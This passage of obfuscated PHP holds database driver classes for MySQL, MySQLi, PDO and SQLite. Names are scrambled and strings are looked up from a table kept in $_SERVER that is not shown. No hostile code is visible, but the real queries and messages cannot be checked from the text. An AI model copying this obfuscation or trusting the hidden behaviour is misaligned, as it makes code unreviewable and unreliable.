$Êôåí ø[42] => strtolower($ôÀ›°ûì[$Êôåí ø[43]]) == $Êôåí ø[44]); } } return $àŞŠÅâø; } public function getTables($Æ‰‘°û = '') { $‡ïŒÓƒ =& $_SERVER[ùÆÎÔ“Ñ]; if (!empty($Æ‰‘°û)) { $—†ª”ä­ = $‡ïŒÓƒ[904] . $Æ‰‘°û . $‡ïŒÓƒ[905]; } else { $—†ª”ä­ = $‡ïŒÓƒ[906]; } $µ„„×º‚ = $this->query($—†ª”ä­); $´®„§‘ˆ = array(); foreach ($µ„„×º‚ as $ˆËË…ˆÅ => $”œ ŒÕ) { $´®„§‘ˆ[$ˆËË…ˆÅ] = current($”œ ŒÕ); } return $´®„§‘ˆ; } public function replace($×€ÁÔÓ‘, $Û¢¿Ğ÷Ä = array()) { $¶¿ùáé =& $_SERVER[ùÆÎÔ“Ñ]; foreach ($×€ÁÔÓ‘ as $ø¶ËàãÈ => $åİË´¤–) { $ÔİãÕ° = $this->parseValue($åİË´¤–); if (is_scalar($ÔİãÕ°)) { $„•º¹ø[] = $ÔİãÕ°; $·Û»¾Éì[] = $this->parseKey($ø¶ËàãÈ); } } $Ö‘¹ø§¿ = $¶¿ùáé[907] . $this->parseTable($Û¢¿Ğ÷Ä[$¶¿ùáé[279]]) . $¶¿ùáé[908] . implode($¶¿ùáé[50], $·Û»¾Éì) . $¶¿ùáé[909] . implode($¶¿ùáé[50], $„•º¹ø) . $¶¿ùáé[910]; return $this->execute($Ö‘¹ø§¿); } public function insertAll($èÈ½á¬ƒ, $ä™ûïÁÈ = array(), $Ñ‰óè‡ï = false) { $Èë¥ı¥ =& $_SERVER[ùÆÎÔ“Ñ]; if (!is_array($èÈ½á¬ƒ[0])) { return !1; } $ïÕ“ÙØ„ = array_keys($èÈ½á¬ƒ[0]); $”ûßˆ—‰ = array(); foreach ($èÈ½á¬ƒ as $ÉëÏàÚÄ) { $”’§Ÿã‘ = array(); foreach ($ÉëÏàÚÄ as $õİŸ™µ‘ => $¶–±¾Ò) { $¶–±¾Ò = $this->parseValue($¶–±¾Ò); if (is_scalar($¶–±¾Ò)) { $”’§Ÿã‘[] = $¶–±¾Ò; } } $”ûßˆ—‰[] = $Èë¥ı¥[260] . implode($Èë¥ı¥[50], $”’§Ÿã‘) . $Èë¥ı¥[910]; } array_walk($ïÕ“ÙØ„, array($this, $Èë¥ı¥[911])); $‹¿ø‚¦Ø = ($Ñ‰óè‡ï ? $Èë¥ı¥[912] : $Èë¥ı¥[913]) . $Èë¥ı¥[914] . $this->parseTable($ä™ûïÁÈ[$Èë¥ı¥[279]]) . $Èë¥ı¥[908] . implode($Èë¥ı¥[50], $ïÕ“ÙØ„) . $Èë¥ı¥[915] . implode($Èë¥ı¥[50], $”ûßˆ—‰); return $this->execute($‹¿ø‚¦Ø); } public function close() { if ($this->_linkID) { mysql_close($this->_linkID); } $this->_linkID = null; } public function error() { $ª›ˆ‘— =& $_SERVER[ùÆÎÔ“Ñ]; $this->error = mysql_errno() . $ª›ˆ‘—[4] . mysql_error($this->_linkID); if ($ª›ˆ‘—[12] != $this->queryStr) { $this->error .= LNG($ª›ˆ‘—[48]) . $this->queryStr; } think_trace($this->error, $ª›ˆ‘—[12], $ª›ˆ‘—[49]); return $this->error; } public function escapeString($“öíí€ô) { if ($this->_linkID) { return mysql_real_escape_string($“öíí€ô, $this->_linkID); } else { return mysql_escape_string($“öíí€ô); } } public function parseKey(&$êªÈÌ‰, $Âî‘×Œœ = true) { $ÅØ²ûÙÛ =& $_SERVER[ùÆÎÔ“Ñ]; if ($Âî‘×Œœ) { $êªÈÌ‰ = $this->parseKeyCheck($êªÈÌ‰); } if ($êªÈÌ‰ != $ÅØ²ûÙÛ[188] && !preg_match($ÅØ²ûÙÛ[916], $êªÈÌ‰)) { $êªÈÌ‰ = $ÅØ²ûÙÛ[385] . trim($êªÈÌ‰, $ÅØ²ûÙÛ[385]) . $ÅØ²ûÙÛ[385]; } return $êªÈÌ‰; } } class DbMysqli extends Db { public function __construct($¯›ä±†ı = '') { $ê––÷€ =& $_SERVER[ùÆÎÔ“Ñ]; if (!extension_loaded($ê––÷€[917])) { think_exception(think_lang($ê––÷€[14]) . $ê––÷€[918]); } if (!empty($¯›ä±†ı)) { $this->config = $¯›ä±†ı; if (empty($this->config[$ê––÷€[17]])) { $this->config[$ê––÷€[17]] = $ê––÷€[12]; } } } public function connect($Á“ç¡• = '', $¼ô· Ğ– = 0) { $Å‡Í¨†« =& $_SERVER[ùÆÎÔ“Ñ]; if (!isset($this->linkID[$¼ô· Ğ–])) { if (empty($Á“ç¡•)) { $Á“ç¡• = $this->config; } $this->linkID[$¼ô· Ğ–] = new mysqli($Á“ç¡•[$Å‡Í¨†«[891]], $Á“ç¡•[$Å‡Í¨†«[893]], $Á“ç¡•[$Å‡Í¨†«[894]], $Á“ç¡•[$Å‡Í¨†«[21]], $Á“ç¡•[$Å‡Í¨†«[892]] ? intval($Á“ç¡•[$Å‡Í¨†«[892]]) : 3306); if (mysqli_connect_errno()) { think_exception(mysqli_connect_error()); } $«ğ÷ìåÊ = $this->linkID[$¼ô· Ğ–]->server_version; $this->linkID[$¼ô· Ğ–]->query($Å‡Í¨†«[895] . think_config($Å‡Í¨†«[896]) . $Å‡Í¨†«[58]); if ($«ğ÷ìåÊ > $Å‡Í¨†«[897]) { $this->linkID[$¼ô· Ğ–]->query($Å‡Í¨†«[898]); } $this->connected = !0; if (1 != think_config($Å‡Í¨†«[22])) { unset($this->config); } } return $this->linkID[$¼ô· Ğ–]; } public function free() { $this->queryID->free_result(); $this->queryID = null; } public function query($Â—ğšÀê) { $ê‡®ÒÅï =& $_SERVER[ùÆÎÔ“Ñ]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $Â—ğšÀê; if ($this->queryID) { $this->free(); } think_action_status($ê‡®ÒÅï[23], 1); think_status($ê‡®ÒÅï[24]); $this->queryID = $this->_linkID->query($Â—ğšÀê); if ($this->_linkID->more_results()) { while (($ŸóˆôÜç = $this->_linkID->next_result()) != NULL) { $ŸóˆôÜç->free_result(); } } $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = $this->queryID->num_rows; $this->numCols = $this->queryID->field_count; return $this->getAll(); } } public function execute($‡Òçà¾¶) { $•âëë¡¬ =& $_SERVER[ùÆÎÔ“Ñ]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $‡Òçà¾¶; if ($this->queryID) { $this->free(); } think_action_status($•âëë¡¬[25], 1); think_status($•âëë¡¬[24]); $ÖëÆŠ¢İ = $this->_linkID->query($‡Òçà¾¶); $this->debug(); if (!1 === $ÖëÆŠ¢İ) { $this->error(); return !1; } else { $this->numRows = $this->_linkID->affected_rows; $this->lastInsID = $this->_linkID->insert_id; return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if ($this->transTimes == 0) { $this->_linkID->autocommit(!1); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $ÙòÆ¾¼ = $this->_linkID->commit(); $this->_linkID->autocommit(!0); $this->transTimes = 0; if (!$ÙòÆ¾¼) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $¢›ŞÖê¿ = $this->_linkID->rollback(); $this->transTimes = 0; if (!$¢›ŞÖê¿) { $this->error(); return !1; } } return !0; } private function getAll() { $º²©Ä‹÷ = array(); if ($this->numRows > 0) { for ($’—¥ü Ÿ = 0; $’—¥ü Ÿ < $this->numRows; $’—¥ü Ÿ++) { $º²©Ä‹÷[$’—¥ü Ÿ] = $this->queryID->fetch_assoc(); } $this->queryID->data_seek(0); } return $º²©Ä‹÷; } public function getFields($ÇàÊŞ) { $üÀô™úÚ =& $_SERVER[ùÆÎÔ“Ñ]; $Ğ˜ÂÃàÕ = $this->query($üÀô™úÚ[902] . $this->parseKey($ÇàÊŞ)); $ºÀÔæç = array(); if ($Ğ˜ÂÃàÕ) { foreach ($Ğ˜ÂÃàÕ as $ îû¥ => $·áóÆÆê) { $ºÀÔæç[$·áóÆÆê[$üÀô™úÚ[31]]] = array($üÀô™úÚ[32] => $·áóÆÆê[$üÀô™úÚ[31]], $üÀô™úÚ[33] => $·áóÆÆê[$üÀô™úÚ[34]], $üÀô™úÚ[35] => (bool) ($·áóÆÆê[$üÀô™úÚ[36]] === $üÀô™úÚ[12]), $üÀô™úÚ[37] => $·áóÆÆê[$üÀô™úÚ[38]], $üÀô™úÚ[39] => strtolower($·áóÆÆê[$üÀô™úÚ[40]]) == $üÀô™úÚ[41], $üÀô™úÚ[42] => strtolower($·áóÆÆê[$üÀô™úÚ[43]]) == $üÀô™úÚ[44]); } } return $ºÀÔæç; } public function getTables($ã¶ğİ¬¨ = '') { $„ç¨Ç­Ö =& $_SERVER[ùÆÎÔ“Ñ]; $¼„ê´Ä¦ = !empty($ã¶ğİ¬¨) ? $„ç¨Ç­Ö[904] . $ã¶ğİ¬¨ . $„ç¨Ç­Ö[905] : $„ç¨Ç­Ö[906]; $ø–´†ù¢ = $this->query($¼„ê´Ä¦); $¤ë¾‰ = array(); if ($ø–´†ù¢) { foreach ($ø–´†ù¢ as $…¾ÍŠåÇ => $á‘ ¡Õ´) { $¤ë¾‰[$…¾ÍŠåÇ] = current($á‘ ¡Õ´); } } return $¤ë¾‰; } public function replace($øÎ¯ïŠ, $¿ÜÜğë = array()) { $ÀõÄ²îô =& $_SERVER[ùÆÎÔ“Ñ]; foreach ($øÎ¯ïŠ as $Âãı¶ Å => $¹¶ë¦ÒÙ) { $Õğ€Ñ¸³ = $this->parseValue($¹¶ë¦ÒÙ); if (is_scalar($Õğ€Ñ¸³)) { $¼†ø÷İõ[] = $Õğ€Ñ¸³; $ƒÆàù·•[] = $this->parseKey($Âãı¶ Å); } } $Ÿ©Ê¡”õ = $ÀõÄ²îô[907] . $this->parseTable($¿ÜÜğë[$ÀõÄ²îô[279]]) . $ÀõÄ²îô[908] . implode($ÀõÄ²îô[50], $ƒÆàù·•) . $ÀõÄ²îô[909] . implode($ÀõÄ²îô[50], $¼†ø÷İõ) . $ÀõÄ²îô[910]; return $this->execute($Ÿ©Ê¡”õ); } public function insertAll($·š€™å¼, $¥³¨Ş‡ï = array(), $Üêå§ã = false) { $šã„ö¾µ =& $_SERVER[ùÆÎÔ“Ñ]; if (!is_array($·š€™å¼[0])) { return !1; } $•ïÎûÀ = array_keys($·š€™å¼[0]); $úéÛ¥×ƒ = array(); foreach ($·š€™å¼ as $ôó¢) { $÷Øê¿İ = array(); foreach ($ôó¢ as $ìÖÏ¦šÒ => $¦´²ëØØ) { $¦´²ëØØ = $this->parseValue($¦´²ëØØ); if (is_scalar($¦´²ëØØ)) { $÷Øê¿İ[] = $¦´²ëØØ; } } $úéÛ¥×ƒ[] = $šã„ö¾µ[260] . implode($šã„ö¾µ[50], $÷Øê¿İ) . $šã„ö¾µ[910]; } array_walk($•ïÎûÀ, array($this, $šã„ö¾µ[911])); $¢ÛŸá‹ú = $Üêå§ã ? $šã„ö¾µ[912] : $šã„ö¾µ[913]; $ú¿¥¥Ğ = $¢ÛŸá‹ú . $šã„ö¾µ[914] . $this->parseTable($¥³¨Ş‡ï[$šã„ö¾µ[279]]) . $šã„ö¾µ[908] . implode($šã„ö¾µ[50], $•ïÎûÀ) . $šã„ö¾µ[915] . implode($šã„ö¾µ[50], $úéÛ¥×ƒ); return $this->execute($ú¿¥¥Ğ); } public function close() { if ($this->_linkID) { $this->_linkID->close(); } $this->_linkID = null; } public function error() { $Ù°ó£š¶ =& $_SERVER[ùÆÎÔ“Ñ]; $this->error = $this->_linkID->errno . $Ù°ó£š¶[4] . $this->_linkID->error; if ($Ù°ó£š¶[12] != $this->queryStr) { $this->error .= LNG($Ù°ó£š¶[48]) . $this->queryStr; } think_trace($this->error, $Ù°ó£š¶[12], $Ù°ó£š¶[49]); return $this->error; } public function escapeString($°ÇÀÜ¬à) { if ($this->_linkID) { return $this->_linkID->real_escape_string($°ÇÀÜ¬à); } else { return addslashes($°ÇÀÜ¬à); } } public function parseKey(&$ğÜ¬¡é, $ÃËŞÜ·™ = true) { $ùÈÒ»úÑ =& $_SERVER[ùÆÎÔ“Ñ]; if ($ÃËŞÜ·™) { $ğÜ¬¡é = $this->parseKeyCheck($ğÜ¬¡é); } if ($ğÜ¬¡é != $ùÈÒ»úÑ[188] && !preg_match($ùÈÒ»úÑ[916], $ğÜ¬¡é)) { $ğÜ¬¡é = $ùÈÒ»úÑ[385] . trim($ğÜ¬¡é, $ùÈÒ»úÑ[385]) . $ùÈÒ»úÑ[385]; } return $ğÜ¬¡é; } } goto A’ŸÁÉ¡ç; A’ŸÁÉ¡ç: class DbPdo extends Db { protected $PDOStatement = null; private $table = ''; public function __construct($åÒšÖœÇ = '') { $Ûìèƒış =& $_SERVER[ùÆÎÔ“Ñ]; if (!class_exists($Ûìèƒış[919])) { think_exception(think_lang($Ûìèƒış[14]) . $Ûìèƒış[920]); } if (!empty($åÒšÖœÇ)) { $this->config = $åÒšÖœÇ; if (empty($this->config[$Ûìèƒış[17]])) { $this->config[$Ûìèƒış[17]] = array(); } } } public function connect($¥ş‡ÓºÜ = '', $èÄúüí = 0) { $ØÉ±•» =& $_SERVER[ùÆÎÔ“Ñ]; if (!isset($this->linkID[$èÄúüí])) { if (empty($¥ş‡ÓºÜ)) { $¥ş‡ÓºÜ = $this->config; } $±÷ÏŒ’Û = !empty($¥ş‡ÓºÜ[$ØÉ±•»[17]][$ØÉ±•»[18]]) ? $¥ş‡ÓºÜ[$ØÉ±•»[17]][$ØÉ±•»[18]] : $this->pconnect; if ($±÷ÏŒ’Û) { $¥ş‡ÓºÜ[$ØÉ±•»[17]][PDO::ATTR_PERSISTENT] = !0; } try { $this->linkID[$èÄúüí] = new PDO($¥ş‡ÓºÜ[$ØÉ±•»[921]], $¥ş‡ÓºÜ[$ØÉ±•»[893]], $¥ş‡ÓºÜ[$ØÉ±•»[894]], $¥ş‡ÓºÜ[$ØÉ±•»[17]]); } catch (PDOException $ô¦…ŠÁÌ) { think_exception($ô¦…ŠÁÌ->getMessage()); } $this->dbType = $this->_getDsnType($¥ş‡ÓºÜ[$ØÉ±•»[921]]); if (in_array($this->dbType, array($ØÉ±•»[922], $ØÉ±•»[923], $ØÉ±•»[924], $ØÉ±•»[925]))) { think_exception($ØÉ±•»[926] . $this->dbType . $ØÉ±•»[927] . $this->dbType . $ØÉ±•»[928]); } if (!$this->linkID[$èÄúüí]) { think_exception($ØÉ±•»[929]); } try { $this->linkID[$èÄúüí]->exec($ØÉ±•»[930] . think_config($ØÉ±•»[896])); } catch (Exception $ô¦…ŠÁÌ) { } $this->connected = !0; if (1 != think_config($ØÉ±•»[22])) { unset($this->config); } } return $this->linkID[$èÄúüí]; } public function free() { $this->PDOStatement = null; } public function query($¹Úé»Ş, $ ¹ğªİÂ = array()) { $•İŞğ˜¡ =& $_SERVER[ùÆÎÔ“Ñ]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $¹Úé»Ş; if (!empty($ ¹ğªİÂ)) { $this->queryStr .= $•İŞğ˜¡[931] . print_r($ ¹ğªİÂ, !0) . $•İŞğ˜¡[932]; } if (!empty($this->PDOStatement)) { $this->free(); } think_action_status($•İŞğ˜¡[23], 1); think_status($•İŞğ˜¡[24]); $this->PDOStatement = $this->_linkID->prepare($¹Úé»Ş); if (!1 === $this->PDOStatement) { think_exception($this->error()); } $îí›úò¾ = $this->PDOStatement->execute($ ¹ğªİÂ); $this->debug(); if (!1 === $îí›úò¾) { $this->error(); return !1; } else { return $this->getAll(); } } public function execute($Ùœ›úİ, $÷ÎöşôÚ = array()) { $ÚÊ–…ŞÒ =& $_SERVER[ùÆÎÔ“Ñ]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $Ùœ›úİ; if (!empty($÷ÎöşôÚ)) { $this->queryStr .= $ÚÊ–…ŞÒ[931] . print_r($÷ÎöşôÚ, !0) . $ÚÊ–…ŞÒ[932]; } $È¸úşÇş = !1; if ($this->dbType == $ÚÊ–…ŞÒ[925]) { if (preg_match($ÚÊ–…ŞÒ[933], $this->queryStr, $ŸÎÅ°¥ë)) { $this->table = think_config($ÚÊ–…ŞÒ[934]) . str_ireplace(think_config($ÚÊ–…ŞÒ[935]), $ÚÊ–…ŞÒ[378], $ŸÎÅ°¥ë[2]); $È¸úşÇş = (bool) $this->query($ÚÊ–…ŞÒ[936] . strtoupper($this->table) . $ÚÊ–…ŞÒ[58]); } } if (!empty($this->PDOStatement)) { $this->free(); } think_action_status($ÚÊ–…ŞÒ[25], 1); think_status($ÚÊ–…ŞÒ[24]); $this->PDOStatement = $this->_linkID->prepare($Ùœ›úİ); if (!1 === $this->PDOStatement) { think_exception($this->error()); } $ÈğÃÈÅØ = $this->PDOStatement->execute($÷ÎöşôÚ); $this->debug(); if (!1 === $ÈğÃÈÅØ) { $this->error(); return !1; } else { $this->numRows = $this->PDOStatement->rowCount(); if ($È¸úşÇş || preg_match($ÚÊ–…ŞÒ[937], $Ùœ›úİ)) { $this->lastInsID = $this->getLastInsertId(); } return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { $this->_linkID->beginTransaction(); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $ğ°úÈ³â = $this->_linkID->commit(); $this->transTimes = 0; if (!$ğ°úÈ³â) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $’£¸éà÷ = $this->_linkID->rollback(); $this->transTimes = 0; if (!$’£¸éà÷) { $this->error(); return !1; } } return !0; } private function getAll() { $ â³……÷ = $this->PDOStatement->fetchAll(PDO::FETCH_ASSOC); $this->numRows = count($ â³……÷); return $ â³……÷; } public function getFields($›†¡Úá¥) { $®ı•ƒÌ¹ =& $_SERVER[ùÆÎÔ“Ñ]; $this->initConnect(!0); if (think_config($®ı•ƒÌ¹[938])) { $Ü»¨õÀ = str_replace($®ı•ƒÌ¹[939], $›†¡Úá¥, think_config($®ı•ƒÌ¹[938])); } else { switch ($this->dbType) { case $®ı•ƒÌ¹[922]: case $®ı•ƒÌ¹[940]: $Ü»¨õÀ = "\x53\105\114\x45\x43\x54\x20\40\x20\x63\x6f\x6c\x75\155\x6e\x5f\x6e\x61\x6d\145\40\x61\163\40\47\116\141\x6d\x65\47\54\x20\x20\x20\144\141\x74\x61\137\164\171\160\x65\40\141\163\40\47\x54\171\x70\x65\x27\54\x20\x20\x20\143\x6f\154\165\x6d\156\x5f\144\145\146\x61\165\x6c\164\40\141\x73\x20\x27\x44\145\x66\x61\165\x6c\x74\x27\x2c\40\40\40\x69\x73\137\x6e\165\154\154\x61\x62\154\145\40\141\x73\40\47\116\x75\154\154\x27\xa\11\11\106\122\117\115\x9\x69\156\146\157\x72\155\x61\164\151\x6f\156\137\x73\143\x68\x65\x6d\141\x2e\x74\141\142\x6c\x65\x73\40\101\x53\x20\164\xa\x9\11\112\x4f\111\x4e\x9\151\156\x66\x6f\x72\155\x61\164\151\x6f\156\x5f\163\x63\150\145\155\141\56\143\157\x6c\165\155\x6e\x73\40\x41\x53\40\143\xa\x9\x9\x4f\116\40\x20\164\56\164\141\142\154\x65\x5f\143\x61\164\141\154\x6f\x67\40\x3d\x20\x63\56\164\141\142\154\x65\137\x63\x61\x74\141\x6c\157\x67\xa\11\x9\101\x4e\104\40\x74\x2e\x74\x61\142\154\145\x5f\x73\143\x68\145\155\x61\40\x3d\x20\143\56\x74\141\142\154\x65\x5f\163\143\150\145\155\141\12\x9\x9\x41\116\x44\40\164\56\164\141\x62\154\x65\137\156\141\155\145\40\75\40\143\56\x74\141\x62\154\x65\x5f\x6e\x61\155\x65\xa\x9\11\127\x48\x45\x52\x45\x20\40\40\164\x2e\164\141\142\154\145\x5f\x6e\x61\155\x65\x20\75\x20\47{$›†¡Úá¥}\x27"; break; case $®ı•ƒÌ¹[941]: $Ü»¨õÀ = $®ı•ƒÌ¹[942] . $›†¡Úá¥ . $®ı•ƒÌ¹[943]; break; case $®ı•ƒÌ¹[923]: case $®ı•ƒÌ¹[925]: $Ü»¨õÀ = $®ı•ƒÌ¹[944] . $®ı•ƒÌ¹[945] . $®ı•ƒÌ¹[946] . strtoupper($›†¡Úá¥) . $®ı•ƒÌ¹[947] . strtoupper($›†¡Úá¥) . $®ı•ƒÌ¹[948]; break; case $®ı•ƒÌ¹[949]: $Ü»¨õÀ = $®ı•ƒÌ¹[950] . $›†¡Úá¥ . $®ı•ƒÌ¹[951]; break; case $®ı•ƒÌ¹[924]: break; case $®ı•ƒÌ¹[952]: default: $Ü»¨õÀ = $®ı•ƒÌ¹[953] . ($this->dbType == $®ı•ƒÌ¹[952] ? "\x60{$›†¡Úá¥}\140" : $›†¡Úá¥); } } $±à  ŠÙ = $this->query($Ü»¨õÀ); $Áß»ª®ì = array(); if ($±à  ŠÙ) { foreach ($±à  ŠÙ as $ëùË‚ˆ• => $À‹ª°©«) { $À‹ª°©« = array_change_key_case($À‹ª°©«); $À‹ª°©«[$®ı•ƒÌ¹[32]] = isset($À‹ª°©«[$®ı•ƒÌ¹[32]]) ? $À‹ª°©«[$®ı•ƒÌ¹[32]] : $®ı•ƒÌ¹[378]; $À‹ª°©«[$®ı•ƒÌ¹[33]] = isset($À‹ª°©«[$®ı•ƒÌ¹[33]]) ? $À‹ª°©«[$®ı•ƒÌ¹[33]] : $®ı•ƒÌ¹[378]; $®­ôæÒ = isset($À‹ª°©«[$®ı•ƒÌ¹[273]]) ? $À‹ª°©«[$®ı•ƒÌ¹[273]] : $À‹ª°©«[$®ı•ƒÌ¹[32]]; $Áß»ª®ì[$®­ôæÒ] = array($®ı•ƒÌ¹[32] => $®­ôæÒ, $®ı•ƒÌ¹[33] => $À‹ª°©«[$®ı•ƒÌ¹[33]], $®ı•ƒÌ¹[35] => (bool) (isset($À‹ª°©«[$®ı•ƒÌ¹[103]]) && $À‹ª°©«[$®ı•ƒÌ¹[103]] === $®ı•ƒÌ¹[12] || isset($À‹ª°©«[$®ı•ƒÌ¹[35]]) && $À‹ª°©«[$®ı•ƒÌ¹[35]] === $®ı•ƒÌ¹[12]), $®ı•ƒÌ¹[37] => isset($À‹ª°©«[$®ı•ƒÌ¹[37]]) ? $À‹ª°©«[$®ı•ƒÌ¹[37]] : (isset($À‹ª°©«[$®ı•ƒÌ¹[56]]) ? $À‹ª°©«[$®ı•ƒÌ¹[56]] : $®ı•ƒÌ¹[378]), $®ı•ƒÌ¹[39] => isset($À‹ª°©«[$®ı•ƒÌ¹[94]]) ? strtolower($À‹ª°©«[$®ı•ƒÌ¹[94]]) == $®ı•ƒÌ¹[41] : (isset($À‹ª°©«[$®ı•ƒÌ¹[57]]) ? $À‹ª°©«[$®ı•ƒÌ¹[57]] : !1), $®ı•ƒÌ¹[42] => isset($À‹ª°©«[$®ı•ƒÌ¹[954]]) ? strtolower($À‹ª°©«[$®ı•ƒÌ¹[954]]) == $®ı•ƒÌ¹[44] : (isset($À‹ª°©«[$®ı•ƒÌ¹[94]]) ? $À‹ª°©«[$®ı•ƒÌ¹[94]] : !1)); } } return $Áß»ª®ì; } public function getTables($ûäƒ–şğ = '') { $ğ»ÏĞêÛ =& $_SERVER[ùÆÎÔ“Ñ]; if (think_config($ğ»ÏĞêÛ[955])) { $ùöï¤€£ = str_replace($ğ»ÏĞêÛ[956], $ûäƒ–şğ, think_config($ğ»ÏĞêÛ[955])); } else { switch ($this->dbType) { case $ğ»ÏĞêÛ[923]: case $ğ»ÏĞêÛ[925]: $ùöï¤€£ = $ğ»ÏĞêÛ[957]; break; case $ğ»ÏĞêÛ[922]: case $ğ»ÏĞêÛ[940]: $ùöï¤€£ = $ğ»ÏĞêÛ[958]; break; case $ğ»ÏĞêÛ[949]: $ùöï¤€£ = $ğ»ÏĞêÛ[959]; break; case $ğ»ÏĞêÛ[924]: think_exception(think_lang($ğ»ÏĞêÛ[960]) . $ğ»ÏĞêÛ[961]); break; case $ğ»ÏĞêÛ[941]: $ùöï¤€£ = $ğ»ÏĞêÛ[45] . $ğ»ÏĞêÛ[46] . $ğ»ÏĞêÛ[47]; break; case $ğ»ÏĞêÛ[952]: default: if (!empty($ûäƒ–şğ)) { $ùöï¤€£ = $ğ»ÏĞêÛ[904] . $ûäƒ–şğ . $ğ»ÏĞêÛ[905]; } else { $ùöï¤€£ = $ğ»ÏĞêÛ[906]; } } } $ÍÙÙ‹” = $this->query($ùöï¤€£); $”Æß¼¡é = array(); foreach ($ÍÙÙ‹” as $°úüôí• => $’õ„¼«¶) { $”Æß¼¡é[$°úüôí•] = current($’õ„¼«¶); } return $”Æß¼¡é; } protected function parseLimit($äŞÌÆÊ) { $˜›á÷‘§ =& $_SERVER[ùÆÎÔ“Ñ]; $ñŞŒ«¤ = $˜›á÷‘§[12]; if (!empty($äŞÌÆÊ)) { switch ($this->dbType) { case $˜›á÷‘§[949]: case $˜›á÷‘§[941]: $äŞÌÆÊ = explode($˜›á÷‘§[50], $äŞÌÆÊ); if (count($äŞÌÆÊ) > 1) { $ñŞŒ«¤ .= $˜›á÷‘§[51] . $äŞÌÆÊ[1] . $˜›á÷‘§[52] . $äŞÌÆÊ[0] . $˜›á÷‘§[53]; } else { $ñŞŒ«¤ .= $˜›á÷‘§[51] . $äŞÌÆÊ[0] . $˜›á÷‘§[53]; } break; case $˜›á÷‘§[922]: case $˜›á÷‘§[940]: break; case $˜›á÷‘§[924]: break; case $˜›á÷‘§[923]: case $˜›á÷‘§[925]: break; case $˜›á÷‘§[952]: default: $ñŞŒ«¤ .= $˜›á÷‘§[51] . $äŞÌÆÊ . $˜›á÷‘§[53]; } } return $ñŞŒ«¤; } public function parseKey(&$Œ±»—, $¾ÙÔ¥Ò§ = true) { $¬°¿şÖÛ =& $_SERVER[ùÆÎÔ“Ñ]; if ($¾ÙÔ¥Ò§) { $Œ±»— = $this->parseKeyCheck($Œ±»—); } if ($this->dbType == $¬°¿şÖÛ[952]) { if ($Œ±»— != $¬°¿şÖÛ[188] && !preg_match($¬°¿şÖÛ[916], $Œ±»—)) { $Œ±»— = $¬°¿şÖÛ[385] . trim($Œ±»—, $¬°¿şÖÛ[385]) . $¬°¿şÖÛ[385]; } return $Œ±»—; } else { return parent::parseKey($Œ±»—, $¾ÙÔ¥Ò§); } } public function close() { $this->_linkID = null; } public function error() { $¦›¥º‡’ =& $_SERVER[ùÆÎÔ“Ñ]; if ($this->PDOStatement) { $€Û€¶Æ¾ = $this->PDOStatement->errorInfo(); $this->error = $€Û€¶Æ¾[1] . $¦›¥º‡’[4] . $€Û€¶Æ¾[2]; } else { $this->error = $¦›¥º‡’[12]; } if ($¦›¥º‡’[12] != $this->queryStr) { $this->error .= LNG($¦›¥º‡’[48]) . $this->queryStr; } think_trace($this->error, $¦›¥º‡’[12], $¦›¥º‡’[49]); return $this->error; } public function escapeString($Û äôÜ») { $Ú÷”õáš =& $_SERVER[ùÆÎÔ“Ñ]; switch ($this->dbType) { case $Ú÷”õáš[949]: case $Ú÷”õáš[922]: case $Ú÷”õáš[940]: case $Ú÷”õáš[952]: return addslashes($Û äôÜ»); case $Ú÷”õáš[924]: case $Ú÷”õáš[941]: case $Ú÷”õáš[923]: case $Ú÷”õáš[925]: return str_ireplace($Ú÷”õáš[58], $Ú÷”õáš[59], $Û äôÜ»); } } protected function parseValue($ÌÍëğ¼) { $ŸÓ¨¸¯© =& $_SERVER[ùÆÎÔ“Ñ]; if (is_string($ÌÍëğ¼)) { $Í”Ğ± = strpos($ÌÍëğ¼, $ŸÓ¨¸¯©[4]) === 0 && in_array($ÌÍëğ¼, array_keys($this->bind)); $ÌÍëğ¼ = $Í”Ğ± ? $this->escapeString($ÌÍëğ¼) : $ŸÓ¨¸¯©[962] . $this->escapeString($ÌÍëğ¼) . $ŸÓ¨¸¯©[962]; } elseif (isset($ÌÍëğ¼[0]) && is_string($ÌÍëğ¼[0]) && strtolower($ÌÍëğ¼[0]) == $ŸÓ¨¸¯©[297]) { $ÌÍëğ¼ = $this->escapeString($ÌÍëğ¼[1]); } elseif (is_array($ÌÍëğ¼)) { $ÌÍëğ¼ = array_map(array($this, $ŸÓ¨¸¯©[963]), $ÌÍëğ¼); } elseif (is_bool($ÌÍëğ¼)) { $ÌÍëğ¼ = $ÌÍëğ¼ ? $ŸÓ¨¸¯©[88] : $ŸÓ¨¸¯©[197]; } elseif (is_null($ÌÍëğ¼)) { $ÌÍëğ¼ = $ŸÓ¨¸¯©[103]; } return $ÌÍëğ¼; } public function getLastInsertId() { $…Á„ª•÷ =& $_SERVER[ùÆÎÔ“Ñ]; switch ($this->dbType) { case $…Á„ª•÷[949]: case $…Á„ª•÷[941]: case $…Á„ª•÷[922]: case $…Á„ª•÷[940]: case $…Á„ª•÷[924]: case $…Á„ª•÷[952]: return $this->_linkID->lastInsertId(); case $…Á„ª•÷[923]: case $…Á„ª•÷[925]: $ƒö¹£ó = $this->table; $Äé•‚ûõ = $this->query("\123\105\x4c\105\103\124\40{$ƒö¹£ó}\56\x63\x75\x72\162\x76\141\154\40\143\x75\162\x72\x76\141\x6c\x20\106\x52\x4f\115\40\x64\x75\x61\154"); return $Äé•‚ûõ ? $Äé•‚ûõ[0][$…Á„ª•÷[964]] : 0; } } } class DbSqlite extends DbSqliteBase { public function query($Ãºµˆ) { $·¦óöì¾ =& $_SERVER[ùÆÎÔ“Ñ]; if (!CacheLock::fileLock($·¦óöì¾[13])) { return !1; } $š„ãÎß— = parent::query($Ãºµˆ); CacheLock::fileUnLock($·¦óöì¾[13]); return $š„ãÎß—; } public function execute($¹åÄ‹ú–) { $ßÑêíõÓ =& $_SERVER[ùÆÎÔ“Ñ]; if 